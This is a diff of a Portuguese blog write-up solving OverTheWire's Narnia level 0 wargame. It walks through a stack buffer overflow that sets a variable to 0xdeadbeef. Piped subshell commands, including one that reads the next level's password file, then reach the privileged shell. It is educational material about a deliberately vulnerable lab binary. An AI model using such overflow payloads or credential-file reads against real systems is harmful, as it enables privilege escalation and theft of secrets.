@@ -22,15 +22,18 @@ Hora de logar no ssh <strong>narnia.labs.overthewire.org</strong> com o user <
 
 Na página da descrição, onde tem mais informações do que contei ali em cima, me disseram que os challs estariam em <strong>/narnia</strong>. Foi nessa hora que entrei no guarda roupa e... Tentei ser engraçado.
 
-```narnia0@melinda:~$ cd /narnia
+```
+narnia0@melinda:~$ cd /narnia
 narnia0@melinda:/narnia$ ls
 narnia0 narnia1.c narnia3 narnia4.c narnia6 narnia7.c
 narnia0.c narnia2 narnia3.c narnia5 narnia6.c narnia8
-narnia1 narnia2.c narnia4 narnia5.c narnia7 narnia8.c```
+narnia1 narnia2.c narnia4 narnia5.c narnia7 narnia8.c
+```
 
 Executei o <strong>narnia0</strong> para descobrir qual era a história da vez:
 
-```narnia0@melinda:/narnia$ ./narnia0
+```
+narnia0@melinda:/narnia$ ./narnia0
 Correct val's value from 0x41414141 -0xdeadbeef!
 Here is your chance: blabla
 buf: blabla
@@ -44,7 +47,7 @@ Tenho uma leve, curta, quase nada, <strong>perto de 0</strong>, experiência com
 
 Se você quer explorar alguma coisa, uma boa ideia é tentar conhece-la antes. Como o código fonte nos foi oferecido, não vamos abrir o gdb e tentar compreender asm.
 
-https://gist.github.com/anonymous/b9358fd281269cc922e8b04aeec97066
+<script src="https://gist.github.com/anonymous/b9358fd281269cc922e8b04aeec97066.js"></script>
 
 No ínicio do programa, dá pra ver <strong>val</strong>. Declarada como <a href="http://linguagemc.com.br/tipos-de-dados-em-c/">long</a> e guardando o valor <a href="https://pt.stackoverflow.com/questions/13573/como-funcionam-os-n%C3%BAmeros-em-hexadecimal">hex</a> <strong>0x4141414</strong>. O objetivo é alterar o valor da mesma para <strong>0xbadbeef</strong>. E alterar sem o programa nos dar uma opção (direta) de fazer isso.
 
@@ -82,7 +85,8 @@ Aí agora que começa a mágica.
 
 Como falei antes, <strong>scanf("%24s",&amp;buf) </strong>tenta salvar em buf mais do que cabe. Já consegue deduzir o que acontece?
 
-```narnia0@melinda:/narnia$ ./narnia0
+```
+narnia0@melinda:/narnia$ ./narnia0
 Correct val's value from 0x41414141 -0xdeadbeef!
 Here is your chance: BBBBBBBBBBBBBBBBBBBBBBBB
 buf: BBBBBBBBBBBBBBBBBBBBBBBB
@@ -103,39 +107,18 @@ Se você é um bom observador, sabe que 0xdeadbeef não é uma simples string e 
 Uma forma de passar esse valor pronto e bem formatado é usando o python. Meu "exploit" ficou assim:
 
 ```
-
 print A*20 + \xef\xbe\xad\xde
-
 ```
 
 Os "<em>\x</em>" avisam que os caracteres precisam ser interpretados como hexadecimais. Ah, e tem também o fato de o valor ter que ser passado com os bytes invertidos. Isto é necessário por causa da nossa arquitetura <a href="https://arqufs2008.wordpress.com/2008/05/26/little-endian-vs-big-endian/">Little Endian</a>.
 
 Tudo pronto para funcionar.
 
-```narnia0@melinda:/narnia$ python -c 'print A*20 + \xef\xbe\xad\xde' | ./narnia0
-Correct val's value from 0x41414141 -0xdeadbeef!
-Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
-val: 0xdeadbeef
-narnia0@melinda:/narnia$
-```
+<script src="https://gist.github.com/nick-belane/0bd97d61a62566ac750d69f4cb994d23.js"></script>
 
 Não houve mensagem de erro, mas também não ganhei nenhuma shell mais privilegiada. Nesse momento fiquei um pouco confuso. Usei o ltrace para tentar diagnosticar rapidamente o que poderia estar acontecendo.
 
-```narnia0@melinda:/narnia$ python -c 'print A*20 + \xef\xbe\xad\xde' | ltrace ./narnia0
-__libc_start_main(0x80484fd, 1, 0xffffd794, 0x80485a0 unfinished ...
-puts(Correct val's value from 0x41414...Correct val's value from 0x41414141 -0xdeadbeef!
-) = 51
-printf(Here is your chance: ) = 21
-__isoc99_scanf(0x8048679, 0xffffd6d8, 0x804a000, 0x80485f2) = 1
-printf(buf: %s\n, AAAAAAAAAAAAAAAAAAAA\357\276\255\336Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ▒
-) = 30
-printf(val: 0x%08x\n, 0xdeadbeefval: 0xdeadbeef
-) = 16
-system(/bin/sh no return ...
---- SIGCHLD (Child exited) ---
-... system resumed) = 0
-+++ exited (status 0) +++
-```
+<script src="https://gist.github.com/nick-belane/a623c371265e7c9641a0657b2e702b25.js"></script>
 
 Aparentemente a shell é aberta mas é fechada logo depois, me deixando na merda.
 
@@ -149,31 +132,19 @@ https://gist.github.com/anonymous/7e19de294370eebadaa0610d5ece8fa9
 
 Compilei e o rodei para verificar se tudo funcionava como queria:
 
-```narnia0@melinda:/tmp/0112$ gcc teste.c -oteste
-narnia0@melinda:/tmp/0112$ ls
-teste teste.c xpl
-narnia0@melinda:/tmp/0112$ ./teste
-$ exit
-narnia0@melinda:/tmp/0112$ ltrace ./teste
-__libc_start_main(0x40052d, 1, 0x7fffffffe6a8, 0x400550 unfinished ...
-system(/bin/sh$ ls
-teste teste.c xpl
-$ exit
-no return ...
---- SIGCHLD (Child exited) ---
-... system resumed) = 0
-+++ exited (status 0) +++
-```
+<script src="https://gist.github.com/nick-belane/eb5dafdf7cc563552d46856e4e68fa56.js"></script>
 
 Tudo funcionando bem. O que eu queria descobrir era o comportamento da shell iniciada por system quando se passasse um input de outro comando via <a href="http://www.guiafoca.org/cgs/guia/iniciante/ch-redir.html">pipe</a> para o meu programa.
 
-```narnia0@melinda:/tmp/0112$ python -c 'print ' | ./teste
+```
+narnia0@melinda:/tmp/0112$ python -c 'print ' | ./teste
 narnia0@melinda:/tmp/0112$
 ```
 
 Parecia que nada acontecia. Então usei o ltrace para confirmar minhas suspeitas:
 
-```narnia0@melinda:/tmp/0112$ python -c 'print ' | ltrace ./teste
+```
+narnia0@melinda:/tmp/0112$ python -c 'print ' | ltrace ./teste
 __libc_start_main(0x40052d, 1, 0x7fffffffe6a8, 0x400550 unfinished ...
 system(/bin/sh no return ...
 --- SIGCHLD (Child exited) ---
@@ -193,7 +164,8 @@ Outra vez me vi vasculhando o google em busca de informação. Aprendi mais um b
 
 O nome é sugestivo. Uma subshell é uma shell dentro de outra shell.
 
-```brenno@budweiser:~$ /bin/sh
+```
+brenno@budweiser:~$ /bin/sh
 $ whoami
 brenno
 $ exit
@@ -206,20 +178,11 @@ Eu sei. Não parece ser a resposta para a pergunta: como enviar a saída de dois
 
 Daí então veio a ideia: executar dois comandos em uma subshell e passar pelo pipe para narnia0 e saber se minha lógica estaria correta e os resultados dos comandos seriam interpretados como duas entradas (uma para buf e outra para a shell).
 
-```narnia0@melinda:/narnia$ (python -c'print A*20 + \xef\xbe\xad\xde'; python -c 'print whoami') | ./narnia0
-Correct val's value from 0x41414141 -0xdeadbeef!
-Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
-val: 0xdeadbeef
-narnia1
-```
+<script src="https://gist.github.com/nick-belane/8e4af0c4b874845efb4a54ca6af94616.js"></script>
 
 PROFIT! Esse narnia1 da última linha veio do whoami que mandei o python imprimir logo depois do exploit. Obviamente foi recebido pela shell aberta com o privilégios que são necessários para a flag.
 
-```narnia0@melinda:/narnia$ (python -c'print A*20 + \xef\xbe\xad\xde'; python -c 'print cat /etc/narnia_pass/narnia1') | ./narnia0
-Correct val's value from 0x41414141 -0xdeadbeef!
-Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ
-val: 0xdeadbeef
-Y3JldQ==```
+<script src="https://gist.github.com/nick-belane/8b5eb98a58374671b4469979f96ac5d6.js"></script>
 
 Esse chall foi divertido e me fez pensar bastante. Write-up só demorou a sair e não ficou nem um pouco com a qualidade que eu esperava porque perdi meu arquivo com todas as notas mentais que criei enquanto tentava resolver.
 
